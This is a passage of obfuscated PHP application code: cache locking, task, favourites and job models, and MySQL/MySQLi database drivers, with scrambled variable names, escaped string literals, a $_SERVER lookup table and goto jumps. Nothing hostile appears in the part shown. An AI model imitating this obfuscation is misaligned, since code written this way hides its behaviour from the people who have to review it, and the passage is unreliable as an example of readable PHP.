fopen($½Ï¤êä’, $‡Í¡‹İ—[890]); if (!$½ÆÒÅÃæ) { return !1; } $öƒ‡¡ÂÛ = flock($½ÆÒÅÃæ, LOCK_EX | LOCK_NB); self::$caches[$ŠºÆå……] = array($‡Í¡‹İ—[891] => $½ÆÒÅÃæ, $‡Í¡‹İ—[200] => $½Ï¤êä’); fwrite($½ÆÒÅÃæ, $ØÁäÔ™¼); clearstatcache(); if ($½ÆÒÅÃæ && $öƒ‡¡ÂÛ) { return !0; } cacheLockWait(); } while (microtime(!0) < $ØÁäÔ™¼); $this->unlock($ŠºÆå……); return !1; } public function lockGet($á³ÌúÑ¬) { $¬’‹Î½Ñ =& $_SERVER[¹ş¤¶ĞÖ]; $©İ·´ªÈ = rtrim(self::$cachePath, $¬’‹Î½Ñ[8]) . $¬’‹Î½Ñ[889] . md5($á³ÌúÑ¬) . $¬’‹Î½Ñ[886]; return file_exists($©İ·´ªÈ); } public function unlock($ëÛÄÚÛ ) { $ÚåöÔ•÷ =& $_SERVER[¹ş¤¶ĞÖ]; $¡‹å¾² = self::$caches[$ëÛÄÚÛ ]; if (!$¡‹å¾²) { return; } @flock($¡‹å¾²[$ÚåöÔ•÷[891]], LOCK_UN); @fclose($¡‹å¾²[$ÚåöÔ•÷[891]]); @unlink($¡‹å¾²[$ÚåöÔ•÷[200]]); unset(self::$caches[$ëÛÄÚÛ ]); } } goto cˆÀ‡õè–; fÁ¤›µ‰¹Í: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x74\x61\163\x6b\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\x65", "\x65\x76\x65\156\x74", "\x74\x69\x6d\x65", "\144\145\x73\x63", "\163\171\x73\x74\145\x6d", "\145\156\x61\142\154\x65", "\x6c\141\163\164\x52\165\156", "\x73\157\162\164"); public function listData($Ñá¥ì¿¾ = false, $ºœ Ï²Ò = "\163\157\162\x74", $êİ‹Ë‘ = false) { return parent::listData($Ñá¥ì¿¾, $ºœ Ï²Ò, $êİ‹Ë‘); } public function add($¶Øú¼Ç¯) { $šÂò´Î¤ =& $_SERVER[¹ş¤¶ĞÖ]; $°“ãá±­ = $this->findByName($¶Øú¼Ç¯[$šÂò´Î¤[32]]); if ($°“ãá±­) { return !1; } $¶Øú¼Ç¯[$šÂò´Î¤[1634]] = 0; $¶Øú¼Ç¯[$šÂò´Î¤[1890]] = $this->getSort(); return parent::insert($¶Øú¼Ç¯); } private function getSort() { $ÉÔ¢€êÑ =& $_SERVER[¹ş¤¶ĞÖ]; $¥€Å”šÚ = parent::listData(); $ãæûÍÁ« = array_to_keyvalue($¥€Å”šÚ, $ÉÔ¢€êÑ[12], $ÉÔ¢€êÑ[1890]); return empty($ãæûÍÁ«) ? 0 : max($ãæûÍÁ«) + 1; } public function update($¤œ²ç´š, $öêÎ­Å³) { $ËÙÕ—§ø =& $_SERVER[¹ş¤¶ĞÖ]; $£¿«èÔ = $this->listData($¤œ²ç´š); $Œõõû„¢ = $this->findByName($öêÎ­Å³[$ËÙÕ—§ø[32]]); if (!$£¿«èÔ || $Œõõû„¢ && $Œõõû„¢[$ËÙÕ—§ø[428]] != $£¿«èÔ[$ËÙÕ—§ø[428]]) { return !1; } return parent::update($¤œ²ç´š, $öêÎ­Å³); } public function remove($¬Ôáªş¹, $«úÃ¸­– = false) { $ô”ôÄÒ =& $_SERVER[¹ş¤¶ĞÖ]; $—®İÃÏ‹ = $this->listData($¬Ôáªş¹); if (!$—®İÃÏ‹) { return; } if (!$«úÃ¸­– && $—®İÃÏ‹[$ô”ôÄÒ[1320]] == $ô”ôÄÒ[88]) { return !1; } return parent::remove($¬Ôáªş¹); } public function enable($¡Á×µ, $ Ê‰‘Ì„) { return $this->update($¡Á×µ, array($_SERVER[¹ş¤¶ĞÖ][2299] => $ Ê‰‘Ì„)); } public function run($ë’éÃŞ¡) { return $this->update($ë’éÃŞ¡, array($_SERVER[¹ş¤¶ĞÖ][2311] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($ÃÜƒäúı) { $¾™Áà† =& $_SERVER[¹ş¤¶ĞÖ]; return array($¾™Áà†[1977] => array(USER_ID, $¾™Áà†[2312])); } protected function listData() { $Î¡ì¤¡ì =& $_SERVER[¹ş¤¶ĞÖ]; $ÕÈçß = array($Î¡ì¤¡ì[1667] => USER_ID, $Î¡ì¤¡ì[512] => 0); $®Ãö¿’… = $Î¡ì¤¡ì[2313]; $±ÛÑ¨“£ = $this->field($®Ãö¿’…)->where($ÕÈçß)->order($Î¡ì¤¡ì[2314])->select(); return $±ÛÑ¨“£ ? $±ÛÑ¨“£ : array(); } protected function resetCache() { } protected function listView() { $¨¾ŒŞ¯° =& $_SERVER[¹ş¤¶ĞÖ]; $¿Ê¶ğÔŒ = $this->listData(); $¸ÓÂØ÷ = array_filter_by_field($¿Ê¶ğÔŒ, $¨¾ŒŞ¯°[33], $¨¾ŒŞ¯°[445]); $µ¾£¨È = array_to_keyvalue($¸ÓÂØ÷, $¨¾ŒŞ¯°[12], $¨¾ŒŞ¯°[84]); if (!$µ¾£¨È) { return $¿Ê¶ğÔŒ; } $“ìßşª¤ = 2000; $ë™’·Û = array($¨¾ŒŞ¯°[446] => array($¨¾ŒŞ¯°[447], $µ¾£¨È)); $“§Û½Ê = Model($¨¾ŒŞ¯°[851])->listSource($ë™’·Û, $“ìßşª¤); $“§Û½Ê = array_merge($“§Û½Ê[$¨¾ŒŞ¯°[83]], $“§Û½Ê[$¨¾ŒŞ¯°[82]]); $“§Û½Ê = array_to_keyvalue($“§Û½Ê, $¨¾ŒŞ¯°[431]); foreach ($¿Ê¶ğÔŒ as $î²à…°ó => $÷õ¢Û) { $œ‘æ³Şä = $“§Û½Ê[$÷õ¢Û[$¨¾ŒŞ¯°[84]]]; $œ‘æ³Şä = $œ‘æ³Şä ? $œ‘æ³Şä : array(); $¿Ê¶ğÔŒ[$î²à…°ó] = array_merge($œ‘æ³Şä, $÷õ¢Û); } return $¿Ê¶ğÔŒ; } protected function addFav($ĞİÏ¾°Ş, $–Ü„®å = '', $¤¨¢Íğ÷ = "\163\x6f\165\162\x63\x65") { $¨á…Ä–Â =& $_SERVER[¹ş¤¶ĞÖ]; $öœâ÷” = array($¨á…Ä–Â[1667] => USER_ID, $¨á…Ä–Â[512] => 0, $¨á…Ä–Â[451] => $¤¨¢Íğ÷, $¨á…Ä–Â[450] => $ĞİÏ¾°Ş); if ($this->where($öœâ÷”)->find()) { return !1; } $öœâ÷” = array($¨á…Ä–Â[1667] => USER_ID, $¨á…Ä–Â[512] => 0); $ÖåÀê£ = $this->where($öœâ÷”)->max($¨á…Ä–Â[1890]); if (!$ÖåÀê£) { $ÖåÀê£ = 0; } if (!$–Ü„®å && $¤¨¢Íğ÷ == $¨á…Ä–Â[445]) { $®Ú½¯î¸ = Model($¨á…Ä–Â[1366])->where(array($¨á…Ä–Â[446] => $ĞİÏ¾°Ş))->find(); if (!$®Ú½¯î¸) { return !1; } $–Ü„®å = $®Ú½¯î¸[$¨á…Ä–Â[32]]; } $–Ü„®å = $this->getAutoName($–Ü„®å); $¼æ‚µËù = array($¨á…Ä–Â[1667] => USER_ID, $¨á…Ä–Â[512] => 0, $¨á…Ä–Â[449] => $–Ü„®å, $¨á…Ä–Â[450] => $ĞİÏ¾°Ş, $¨á…Ä–Â[451] => $¤¨¢Íğ÷, $¨á…Ä–Â[1870] => $ÖåÀê£ + 1); return $this->add($¼æ‚µËù); } protected function remove($´€Ø½») { $µÌœÑ‹” =& $_SERVER[¹ş¤¶ĞÖ]; $À Ó„² = array($µÌœÑ‹”[1667] => USER_ID, $µÌœÑ‹”[448] => $´€Ø½»); return $this->where($À Ó„²)->delete(); } protected function removeByName($÷Ã•Ğ¿ô) { $Ò‘×Õô =& $_SERVER[¹ş¤¶ĞÖ]; $´³ºæ = array($Ò‘×Õô[1667] => USER_ID, $Ò‘×Õô[449] => $÷Ã•Ğ¿ô, $Ò‘×Õô[512] => 0); return $this->where($´³ºæ)->delete(); } protected function rename($ì€ÉÉëõ, $ËõËÌ¯) { $®•ûëˆ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ì€ÉÉëõ == $ËõËÌ¯) { return !1; } $Î­“£ÎÉ = $this->getAutoName($ËõËÌ¯); if ($ËõËÌ¯ != $Î­“£ÎÉ) { return !1; } $ß¸—¼Ñ÷ = array($®•ûëˆ[1667] => USER_ID, $®•ûëˆ[512] => 0, $®•ûëˆ[32] => $ì€ÉÉëõ); return $this->where($ß¸—¼Ñ÷)->save(array($®•ûëˆ[32] => $ËõËÌ¯)); } protected function resetSort($œ¼Ø¦ÂÀ) { $íóÓÎ¥ =& $_SERVER[¹ş¤¶ĞÖ]; $œ¼Ø¦ÂÀ = is_array($œ¼Ø¦ÂÀ) ? $œ¼Ø¦ÂÀ : array(); $Á¾—‰èõ = array($íóÓÎ¥[1667] => USER_ID); for ($‰É®¿óŞ = 0; $‰É®¿óŞ < count($œ¼Ø¦ÂÀ); $‰É®¿óŞ++) { $Á¾—‰èõ[$íóÓÎ¥[448]] = $œ¼Ø¦ÂÀ[$‰É®¿óŞ]; $this->where($Á¾—‰èõ)->save(array($íóÓÎ¥[1870] => $‰É®¿óŞ + 1)); } return !0; } protected function moveTop($·×ñèë) { $Ÿ”ÀÒ‘ =& $_SERVER[¹ş¤¶ĞÖ]; $–ö—à¡ = array($Ÿ”ÀÒ‘[1667] => USER_ID, $Ÿ”ÀÒ‘[512] => 0); $ÈÔ ²íÎ = $this->where($–ö—à¡)->where(array($Ÿ”ÀÒ‘[32] => $·×ñèë))->find(); if (!$ÈÔ ²íÎ) { return; } $ß¤šéÃ = $this->field($Ÿ”ÀÒ‘[428])->where($–ö—à¡)->order($Ÿ”ÀÒ‘[2314])->select(); $ß¤šéÃ = array_to_keyvalue($ß¤šéÃ, $Ÿ”ÀÒ‘[12], $Ÿ”ÀÒ‘[428]); $Å‡Å“Ş = $ß¤šéÃ; $ß¤šéÃ = array_remove_value($ß¤šéÃ, $ÈÔ ²íÎ[$Ÿ”ÀÒ‘[428]]); array_unshift($ß¤šéÃ, $ÈÔ ²íÎ[$Ÿ”ÀÒ‘[428]]); return $this->resetSort($ß¤šéÃ); } protected function moveBottom($Ãéçñ³¯) { $œ›¹ø‰ =& $_SERVER[¹ş¤¶ĞÖ]; $õ¿ËØçø = array($œ›¹ø‰[1667] => USER_ID, $œ›¹ø‰[512] => 0); $¡ú ÁÕ¸ = $this->where($õ¿ËØçø)->max($œ›¹ø‰[1890]); $ÃŞÌ¨…¶ = array($œ›¹ø‰[1890] => $¡ú ÁÕ¸ + 1); return $this->where($õ¿ËØçø)->where(array($œ›¹ø‰[32] => $Ãéçñ³¯))->save($ÃŞÌ¨…¶); } private function getAutoName($‹Ó¨ãÁô) { $©ŠÖä‚‰ =& $_SERVER[¹ş¤¶ĞÖ]; $©è’ïÛ = array($©ŠÖä‚‰[1667] => USER_ID, $©ŠÖä‚‰[512] => 0); $¹£ÂµôŒ = $this->field($©ŠÖä‚‰[32])->where($©è’ïÛ)->select(); $¹£ÂµôŒ = array_to_keyvalue($¹£ÂµôŒ, $©ŠÖä‚‰[12], $©ŠÖä‚‰[32]); if (!$¹£ÂµôŒ || !in_array($‹Ó¨ãÁô, $¹£ÂµôŒ)) { return $‹Ó¨ãÁô; } for ($‘êˆãİš = 0; $‘êˆãİš < count($¹£ÂµôŒ); $‘êˆãİš++) { if (!in_array($‹Ó¨ãÁô . "\50{$‘êˆãİš}\x29", $¹£ÂµôŒ)) { return $‹Ó¨ãÁô . "\50{$‘êˆãİš}\51"; } } return $‹Ó¨ãÁô . "\x28{$‘êˆãİš}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\152\x6f\142\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\144\145\x73\x63", "\163\157\162\164"); const JOB_KEY = "\163\x65\x6c\146\112\157\142\x4c\x69\163\164"; public function listData($™§ÕİÂ = false, $ëÏÈ¦“í = "\163\157\162\164", $õ÷€”ôĞ = false) { return parent::listData($™§ÕİÂ, $ëÏÈ¦“í, $õ÷€”ôĞ); } public function remove($ã“º—…ç) { return parent::remove($ã“º—…ç); } public function add($·–ŸÚï) { $áÙèÎ“ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->findByName($·–ŸÚï[$áÙèÎ“[32]])) { return !1; } $·–ŸÚï[$áÙèÎ“[1890]] = $this->getSort(); return parent::insert($·–ŸÚï); } private function getSort() { $ª­îöø„ =& $_SERVER[¹ş¤¶ĞÖ]; $Ÿ·‹öÊğ = parent::listData(); $½³¢àïÛ = array_to_keyvalue($Ÿ·‹öÊğ, $ª­îöø„[12], $ª­îöø„[1890]); return empty($½³¢àïÛ) ? 0 : max($½³¢àïÛ) + 1; } public function update($Œò»™ÉÂ, $ÑõÉ¬) { $çˆ¢Å•¢ =& $_SERVER[¹ş¤¶ĞÖ]; $·Äò•á“ = parent::listData($Œò»™ÉÂ); $“ô„È»Î = $this->findByName($ÑõÉ¬[$çˆ¢Å•¢[32]]); if (!$·Äò•á“ || $“ô„È»Î && $“ô„È»Î[$çˆ¢Å•¢[428]] != $·Äò•á“[$çˆ¢Å•¢[428]]) { return !1; } return parent::update($Œò»™ÉÂ, $ÑõÉ¬); } public function setUserJob($˜ó½³ÛË, $ôùÎµ¨µ) { $£âÅÂ¾à =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($ôùÎµ¨µ)) { $ôùÎµ¨µ = array($ôùÎµ¨µ); } $Š«Ş©ü¸ = parent::listData(); $Å„“ ˆö = array_to_keyvalue($Š«Ş©ü¸, $£âÅÂ¾à[32]); $æšƒú«× = $£âÅÂ¾à[407]; foreach ($ôùÎµ¨µ as $ÎßŠİ¼¡) { if ($Å„“ ˆö[$ÎßŠİ¼¡]) { $æšƒú«× .= $Å„“ ˆö[$ÎßŠİ¼¡][$£âÅÂ¾à[428]] . $£âÅÂ¾à[50]; } else { $Ò»½ÌĞŠ = $this->add($ÎßŠİ¼¡); $æšƒú«× .= $Ò»½ÌĞŠ . $£âÅÂ¾à[50]; } } $æšƒú«× = rtrim($æšƒú«×, $£âÅÂ¾à[50]); Model($£âÅÂ¾à[554])->metaSet($˜ó½³ÛË, self::JOB_KEY, $æšƒú«×); } public function getUserJob($‰÷À‚‡ˆ) { $Ú›ø³¶ü = Model($_SERVER[¹ş¤¶ĞÖ][554])->metaGet($‰÷À‚‡ˆ); return $this->getUserJobInfo($Ú›ø³¶ü[self::JOB_KEY]); } public function getUserJobInfo($íí•Íô) { $›ÁåÆÑ· =& $_SERVER[¹ş¤¶ĞÖ]; $ÌÔÔÇÇ‰ = explode($›ÁåÆÑ·[50], $íí•Íô); $şŞË³°ó = parent::listData(); $şŞË³°ó = array_remove_key($şŞË³°ó, $›ÁåÆÑ·[201]); $ÌèÈ ıô = array(); foreach ($ÌÔÔÇÇ‰ as $¸ğ¡üˆ) { if (isset($şŞË³°ó[$¸ğ¡üˆ])) { $ÌèÈ ıô[] = $şŞË³°ó[$¸ğ¡üˆ]; } } return $ÌèÈ ıô; } } goto A™¸Ó¾¶”™; Aˆñ±¿°‚È: define($_SERVER[¹ş¤¶ĞÖ][267], 1); define($_SERVER[¹ş¤¶ĞÖ][268], 2); define($_SERVER[¹ş¤¶ĞÖ][269], 3); goto A­ğ‘¥›’; e¬è¦²í‰®: class DbMysql extends Db { public function __construct($ÃŸš¿¨Ü = '') { $‰äÑéÏÊ =& $_SERVER[¹ş¤¶ĞÖ]; if (!extension_loaded($‰äÑéÏÊ[830])) { think_exception(think_lang($‰äÑéÏÊ[14]) . $‰äÑéÏÊ[916]); } if (!empty($ÃŸš¿¨Ü)) { $this->config = $ÃŸš¿¨Ü; if (empty($this->config[$‰äÑéÏÊ[17]])) { $this->config[$‰äÑéÏÊ[17]] = $‰äÑéÏÊ[12]; } } } public function connect($ËèÉõ€‰ = '', $”ÊÍá¢… = 0, $æú¥ë÷Û = false) { $ßå–Ò´® =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->linkID[$”ÊÍá¢…])) { if (empty($ËèÉõ€‰)) { $ËèÉõ€‰ = $this->config; } $€Úóóê« = $ËèÉõ€‰[$ßå–Ò´®[917]] . ($ËèÉõ€‰[$ßå–Ò´®[918]] ? "\x3a{$ËèÉõ€‰[$ßå–Ò´®[918]]}" : $ßå–Ò´®[12]); $êÛìı‹ï = !empty($ËèÉõ€‰[$ßå–Ò´®[17]][$ßå–Ò´®[18]]) ? $ËèÉõ€‰[$ßå–Ò´®[17]][$ßå–Ò´®[18]] : $this->pconnect; if ($êÛìı‹ï) { $this->linkID[$”ÊÍá¢…] = mysql_pconnect($€Úóóê«, $ËèÉõ€‰[$ßå–Ò´®[919]], $ËèÉõ€‰[$ßå–Ò´®[920]], 131072); } else { $this->linkID[$”ÊÍá¢…] = mysql_connect($€Úóóê«, $ËèÉõ€‰[$ßå–Ò´®[919]], $ËèÉõ€‰[$ßå–Ò´®[920]], !0, 131072); } if (!$this->linkID[$”ÊÍá¢…] || !empty($ËèÉõ€‰[$ßå–Ò´®[21]]) && !mysql_select_db($ËèÉõ€‰[$ßå–Ò´®[21]], $this->linkID[$”ÊÍá¢…])) { think_exception(mysql_error()); } $˜óŞÂ¨Õ = mysql_get_server_info($this->linkID[$”ÊÍá¢…]); mysql_query($ßå–Ò´®[921] . think_config($ßå–Ò´®[922]) . $ßå–Ò´®[58], $this->linkID[$”ÊÍá¢…]); if ($˜óŞÂ¨Õ > $ßå–Ò´®[923]) { mysql_query($ßå–Ò´®[924], $this->linkID[$”ÊÍá¢…]); } $this->connected = !0; if (1 != think_config($ßå–Ò´®[22])) { unset($this->config); } } return $this->linkID[$”ÊÍá¢…]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‚âîì¦) { $øŠ°ç¥ =& $_SERVER[¹ş¤¶ĞÖ]; if (0 === stripos($‚âîì¦, $øŠ°ç¥[293])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚âîì¦; if ($this->queryID) { $this->free(); } think_action_status($øŠ°ç¥[23], 1); think_status($øŠ°ç¥[24]); $this->queryID = mysql_query($‚âîì¦, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ü¶»ô…) { $ê¦Å¾ÆŸ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü¶»ô…; if ($this->queryID) { $this->free(); } think_action_status($ê¦Å¾ÆŸ[25], 1); think_status($ê¦Å¾ÆŸ[24]); $¸Ø½æ¬ö = mysql_query($Ü¶»ô…, $this->_linkID); $this->debug(); if (!1 === $¸Ø½æ¬ö) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹ş¤¶ĞÖ][925], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»ÓØÎøÔ = mysql_query($_SERVER[¹ş¤¶ĞÖ][926], $this->_linkID); $this->transTimes = 0; if (!$»ÓØÎøÔ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ĞÒãê¦¤ = mysql_query($_SERVER[¹ş¤¶ĞÖ][927], $this->_linkID); $this->transTimes = 0; if (!$ĞÒãê¦¤) { $this->error(); return !1; } } return !0; } private function getAll() { $šË‡‰…ø = array(); if ($this->numRows > 0) { while ($ÛØÙÅ”â = mysql_fetch_assoc($this->queryID)) { $šË‡‰…ø[] = $ÛØÙÅ”â; } mysql_data_seek($this->queryID, 0); } return $šË‡‰…ø; } public function getFields($Íİû©ã±) { $€€ö ‚Ú =& $_SERVER[¹ş¤¶ĞÖ]; $€×ÍØ¡ù = $this->query($€€ö ‚Ú[928] . $this->parseKey($Íİû©ã±)); $ÑºûÖ¿ = array(); if ($€×ÍØ¡ù) { foreach ($€×ÍØ¡ù as $³ÒÜÁí¢ => $¥£ü§—ã) { $ÑºûÖ¿[$¥£ü§—ã[$€€ö ‚Ú[31]]] = array($€€ö ‚Ú[32] => $¥£ü§—ã[$€€ö ‚Ú[31]], $€€ö ‚Ú[33] => $¥£ü§—ã[$€€ö ‚Ú[34]], $€€ö ‚Ú[35] => (bool) (strtoupper($¥£ü§—ã[$€€ö ‚Ú[36]]) === $€€ö ‚Ú[929]), $€€ö ‚Ú[37] => $¥£ü§—ã[$€€ö ‚Ú[38]], $€€ö ‚Ú[39] => strtolower($¥£ü§—ã[$€€ö ‚Ú[40]]) == $€€ö ‚Ú[41], $€€ö ‚Ú[42] => strtolower($¥£ü§—ã[$€€ö ‚Ú[43]]) == $€€ö ‚Ú[44]); } } return $ÑºûÖ¿; } public function getTables($úÀÙË“ = '') { $¯“Ş¢ß =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($úÀÙË“)) { $ï™¨ÖÒ† = $¯“Ş¢ß[930] . $úÀÙË“ . $¯“Ş¢ß[931]; } else { $ï™¨ÖÒ† = $¯“Ş¢ß[932]; } $›éÇ€ = $this->query($ï™¨ÖÒ†); $ÌåŸş¶» = array(); foreach ($›éÇ€ as $ßüÓ£î« => $â¥“í«Ë) { $ÌåŸş¶»[$ßüÓ£î«] = current($â¥“í«Ë); } return $ÌåŸş¶»; } public function replace($á›ùÉ´ı, $ğ©Êô‹ = array()) { $Ğå•Ø¼ =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($á›ùÉ´ı as $Æòõ´’ø => $Šõ€ÈÅ‰) { $™¹¿¶°© = $this->parseValue($Šõ€ÈÅ‰); if (is_scalar($™¹¿¶°©)) { $‰æˆù³‘[] = $™¹¿¶°©; $ºŒ†«Óª[] = $this->parseKey($Æòõ´’ø); } } $åÍÆ‰¯§ = $Ğå•Ø¼[933] . $this->parseTable($ğ©Êô‹[$Ğå•Ø¼[308]]) . $Ğå•Ø¼[934] . implode($Ğå•Ø¼[50], $ºŒ†«Óª) . $Ğå•Ø¼[935] . implode($Ğå•Ø¼[50], $‰æˆù³‘) . $Ğå•Ø¼[936]; return $this->execute($åÍÆ‰¯§); } public function insertAll($»ÀïÒï, $Ç£Ö™Å = array(), $¹ãĞª€÷ = false) { $¸ †ÒüÊ =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($»ÀïÒï[0])) { return !1; } $îò÷üâ© = array_keys($»ÀïÒï[0]); $¯éÚ›  = array(); foreach ($»ÀïÒï as $áÆÌÏ÷) { $ßôŞ§• = array(); foreach ($áÆÌÏ÷ as $ÆÒüÒÀ => $Ö£÷‹®ö) { $Ö£÷‹®ö = $this->parseValue($Ö£÷‹®ö); if (is_scalar($Ö£÷‹®ö)) { $ßôŞ§•[] = $Ö£÷‹®ö; } } $¯éÚ› [] = $¸ †ÒüÊ[289] . implode($¸ †ÒüÊ[50], $ßôŞ§•) . $¸ †ÒüÊ[936]; } array_walk($îò÷üâ©, array($this, $¸ †ÒüÊ[937])); $÷¯… = ($¹ãĞª€÷ ? $¸ †ÒüÊ[938] : $¸ †ÒüÊ[939]) . $¸ †ÒüÊ[940] . $this->parseTable($Ç£Ö™Å[$¸ †ÒüÊ[308]]) . $¸ †ÒüÊ[934] . implode($¸ †ÒüÊ[50], $îò÷üâ©) . $¸ †ÒüÊ[941] . implode($¸ †ÒüÊ[50], $¯éÚ› ); return $this->execute($÷¯…); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ä ¨Š =& $_SERVER[¹ş¤¶ĞÖ]; $this->error = mysql_errno() . $ä ¨Š[4] . mysql_error($this->_linkID); if ($ä ¨Š[12] != $this->queryStr) { $this->error .= LNG($ä ¨Š[48]) . $this->queryStr; } think_trace($this->error, $ä ¨Š[12], $ä ¨Š[49]); return $this->error; } public function escapeString($ûŒƒ³Ìµ) { if ($this->_linkID) { return mysql_real_escape_string($ûŒƒ³Ìµ, $this->_linkID); } else { return mysql_escape_string($ûŒƒ³Ìµ); } } public function parseKey(&$•ôîÔĞ, $é³»Ü ” = true) { $ñ½ÔÓ§¼ =& $_SERVER[¹ş¤¶ĞÖ]; if ($é³»Ü ”) { $•ôîÔĞ = $this->parseKeyCheck($•ôîÔĞ); } if ($•ôîÔĞ != $ñ½ÔÓ§¼[189] && !preg_match($ñ½ÔÓ§¼[942], $•ôîÔĞ)) { $•ôîÔĞ = $ñ½ÔÓ§¼[414] . trim($•ôîÔĞ, $ñ½ÔÓ§¼[414]) . $ñ½ÔÓ§¼[414]; } return $•ôîÔĞ; } } class DbMysqli extends Db { public function __construct($”©…Ú• = '') { $ŸöĞ¬–İ =& $_SERVER[¹ş¤¶ĞÖ]; if (!extension_loaded($ŸöĞ¬–İ[943])) { think_exception(think_lang($ŸöĞ¬–İ[14]) . $ŸöĞ¬–İ[944]); } if (!empty($”©…Ú•)) { $this->config = $”©…Ú•; if (empty($this->config[$ŸöĞ¬–İ[17]])) { $this->config[$ŸöĞ¬–İ[17]] = $ŸöĞ¬–İ[12]; } } } public function connect($›İ„µñÕ = '', $·¡®àÔ = 0) { $şÎŸ€«Ş =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->linkID[$·¡®àÔ])) { if (empty($›İ„µñÕ)) { $›İ„µñÕ = $this->config; } $this->linkID[$·¡®àÔ] = new mysqli($›İ„µñÕ[$şÎŸ€«Ş[917]], $›İ„µñÕ[$şÎŸ€«Ş[919]], $›İ„µñÕ[$şÎŸ€«Ş[920]], $›İ„µñÕ[$şÎŸ€«Ş[21]], $›İ„µñÕ[$şÎŸ€«Ş[918]] ? intval($›İ„µñÕ[$şÎŸ€«Ş[918]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $…ïı©ÚÛ = $this->linkID[$·¡®àÔ]->server_version; $this->linkID[$·¡®àÔ]->query($şÎŸ€«Ş[921] . think_config($şÎŸ€«Ş[922]) . $şÎŸ€«Ş[58]); if ($…ïı©ÚÛ > $şÎŸ€«Ş[923]) { $this->linkID[$·¡®àÔ]->query($şÎŸ€«Ş[924]); } $this->connected = !0; if (1 != think_config($şÎŸ€«Ş[22])) { unset($this->config); } } return $this->linkID[$·¡®àÔ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ÿƒòƒéƒ) { $¬à…Æ¿Û =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿƒòƒéƒ; if ($this->queryID) { $this->free(); } think_action_status($¬à…Æ¿Û[23], 1); think_status($¬à…Æ¿Û[24]); $this->queryID = $this->_linkID->query($Ÿƒòƒéƒ); if ($this->_linkID->more_results()) { while (($¯†ê‚ºğ = $this->_linkID->next_result()) != NULL) { $¯†ê‚ºğ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¥‹Ö§·š) { $¿ÌŒõÂ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥‹Ö§·š; if ($this->queryID) { $this->free(); } think_action_status($¿ÌŒõÂ[25], 1); think_status($¿ÌŒõÂ[24]); $‘èä†Ñ = $this->_linkID->query($¥‹Ö§·š); $this->debug(); if (!1 === $‘èä†Ñ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÖôÅ¶¸Ê = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÖôÅ¶¸Ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $—»ƒëÃŞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$—»ƒëÃŞ) { $this->error(); return !1; } } return !0; } private function getAll() { $ôİ¸œ´É = array(); if ($this->numRows > 0) { for ($™¯Ç¾º = 0; $™¯Ç¾º < $this->numRows; $™¯Ç¾º++) { $ôİ¸œ´É[$™¯Ç¾º] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ôİ¸œ´É; } public function getFields($œğ©É®) { $Î¿­’¤ =& $_SERVER[¹ş¤¶ĞÖ]; $ŒØ±Ë‰´ = $this->query($Î¿­’¤[928] . $this->parseKey($œğ©É®)); $ÌÌôæ…õ = array(); if ($ŒØ±Ë‰´) { foreach ($ŒØ±Ë‰´ as $·½ç => $®È´‰ßø) { $ÌÌôæ…õ[$®È´‰ßø[$Î¿­’¤[31]]] = array($Î¿­’¤[32] => $®È´‰ßø[$Î¿­’¤[31]], $Î¿­’¤[33] => $®È´‰ßø[$Î¿­’¤[34]], $Î¿­’¤[35] => (bool) ($®È´‰ßø[$Î¿­’¤[36]] === $Î¿­’¤[12]), $Î¿­’¤[37] => $®È´‰ßø[$Î¿­’¤[38]], $Î¿­’¤[39] => strtolower($®È´‰ßø[$Î¿­’¤[40]]) == $Î¿­’¤[41], $Î¿­’¤[42] => strtolower($®È´‰ßø[$Î¿­’¤[43]]) == $Î¿­’¤[44]); } } return $ÌÌôæ…õ; } public function getTables($´–ÆÉÉ = '') 